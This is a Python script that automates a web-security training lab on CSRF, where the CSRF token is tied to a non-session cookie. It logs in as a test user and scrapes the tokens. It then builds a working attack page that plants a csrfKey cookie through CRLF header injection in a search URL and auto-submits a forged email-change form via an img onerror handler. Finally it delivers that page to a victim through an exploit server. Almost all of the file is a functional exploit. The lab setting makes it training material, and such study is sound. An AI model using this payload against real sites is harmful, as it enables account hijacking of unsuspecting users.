import requests
import re
import urllib3
from colorama import Fore


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "CSRF where token is tied to non-session cookie"

def extract_csrf_token(html):
    match = re.search(r'name="csrf"\s+value="(.+?)"', html)
    return match.group(1) if match else None

def post_data(url, data, cookies=None, allow_redirects=True):
    try:
        return requests.post(url, data=data, cookies=cookies, allow_redirects=allow_redirects, verify=False)
    except Exception as e:
        print(f"[!] Failed to post data: {e}")
        return None

def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the login page\n2. Extract the csrf token, session cookie and csrfKey cookie\n3. Login as wiener\n4. Fetch wiener profile\n5. Extract the csrf token that is needed for email update\n6. Craft an HTML form for changing the email address that includes the extracted csrf token and an img tag which is used to set the csrfKey cookie via its src and submit the form via its error handler\n7. Deliver the exploit to the victim\n8. The victim's email will be changed after they trigger the exploit\n""")

    url = url.rstrip('/')
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    print("[*] Fetching login page...")
    login_page = session.get(f"{url}/login")
    csrf_token = extract_csrf_token(login_page.text)
    session_cookie = login_page.cookies.get("session")
    csrf_key = login_page.cookies.get("csrfKey")

    if not csrf_token or not csrf_key or not session_cookie:
        print("[!] Missing csrf_token, csrfKey, or session cookie.")
        return False

    print("[+] Login as wiener...")
    login_data = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    cookies = {
        "session": session_cookie,
        "csrfKey": csrf_key
    }
    session.post(f"{url}/login", data=login_data, cookies=cookies)

    print("[*] Fetching profile to get updated CSRF token...")
    profile_page = session.get(f"{url}/my-account")
    csrf_token = extract_csrf_token(profile_page.text)
    csrf_key = profile_page.cookies.get("csrfKey")

    if not csrf_token or not csrf_key:
        print("[!] Failed to extract CSRF token or csrfKey from profile page.")
        return False

    exploit_server = input("[?] Enter the exploit server URL: ").strip().rstrip('/')

    new_email = "hacked@you.com"
    payload = f"""<html>
    <body>
    <form action="{url}/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="{new_email}" />
        <input type="hidden" name="csrf" value="{csrf_token}" />
        <input type="submit" value="Submit request" />
    </form>
    <img src="{url}/?search=crlf%0d%0aSet-Cookie:+csrfKey={csrf_key};+SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>"""

    exploit_data = {
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": payload,
        "formAction": "DELIVER_TO_VICTIM",
        "urlIsHttps": "on",
        "responseFile": "/exploit"
    }

    print("[*] Delivering exploit to victim...")
    res = post_data(f"{exploit_server}/", exploit_data)
    if res and res.status_code == 200:
        print("[+] Exploit delivered successfully!")
        print("[+] Lab should be marked as solved.")
        return True
    else:
        print("[-] Exploit delivery failed.")
        return False
